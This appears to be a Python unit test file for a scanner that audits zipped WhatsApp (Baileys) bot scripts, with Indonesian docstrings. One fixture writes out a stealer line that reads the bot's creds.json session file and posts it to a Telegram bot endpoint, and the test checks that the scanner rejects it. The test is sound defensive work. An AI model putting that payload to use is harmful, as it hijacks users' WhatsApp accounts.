import unittest
import os
import shutil
import tempfile
import zipfile
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from modules.omni_titan_auditor import OmniTitanAuditor

class TestOmniTitanAuditor(unittest.TestCase):
    def setUp(self):
        self.test_dir = tempfile.mkdtemp()
        self.q_dir = os.path.join(self.test_dir, "quarantine")
        self.db_path = os.path.join(self.test_dir, "test.sqlite")
        os.makedirs(self.q_dir, exist_ok=True)
        self.auditor = OmniTitanAuditor(db_path=self.db_path, quarantine_dir=self.q_dir)

    def tearDown(self):
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_clean_script_audit(self):
        """Uji skrip bersih (Clean script) harus lolos VERIFIED_SAFE"""
        zip_path = os.path.join(self.q_dir, "clean_bot.zip")
        with zipfile.ZipFile(zip_path, "w") as z:
            z.writestr("package.json", '{"name": "clean-bot", "dependencies": {"@whiskeysockets/baileys": "^6.5.0"}}')
            z.writestr("index.js", 'console.log("Starting clean Baileys WhatsApp bot");')
            z.writestr("plugins/downloader.js", 'async function downloadTiktok() { return "url"; }')

        res = self.auditor.audit_zip_file(zip_path)
        self.assertEqual(res["verdict"], "VERIFIED_SAFE")
        self.assertGreaterEqual(res["security_score"], 80)
        self.assertIn("WhiskeySockets Baileys", res["baileys_version"])

    def test_malicious_stealer_detected(self):
        """Adversarial Test: Skrip dengan payload pencuri session harus DITOLAK (REJECTED_DANGEROUS)"""
        zip_path = os.path.join(self.q_dir, "malicious_stealer.zip")
        with zipfile.ZipFile(zip_path, "w") as z:
            z.writestr("index.js", 'const creds = fs.readFileSync("./auth_info_baileys/creds.json"); axios.post("https://api.telegram.org/bot123/sendDocument", creds);')

        res = self.auditor.audit_zip_file(zip_path)
        self.assertEqual(res["verdict"], "REJECTED_DANGEROUS")
        self.assertLess(res["security_score"], 50)
        self.assertTrue(any("Telegram Bot Session Exfiltration" in f or "WhatsApp Session Folder Theft" in f for f in res["findings"]))

    def test_corrupted_zip_handled(self):
        """Edge Case: File ZIP rusak tidak boleh menyebabkan uncaught crash"""
        corrupted_path = os.path.join(self.q_dir, "corrupted.zip")
        with open(corrupted_path, "wb") as f:
            f.write(b"not a valid zip binary content here")

        res = self.auditor.audit_zip_file(corrupted_path)
        self.assertEqual(res["verdict"], "REJECTED_DANGEROUS")
        self.assertEqual(res["security_score"], 0)

if __name__ == "__main__":
    unittest.main()
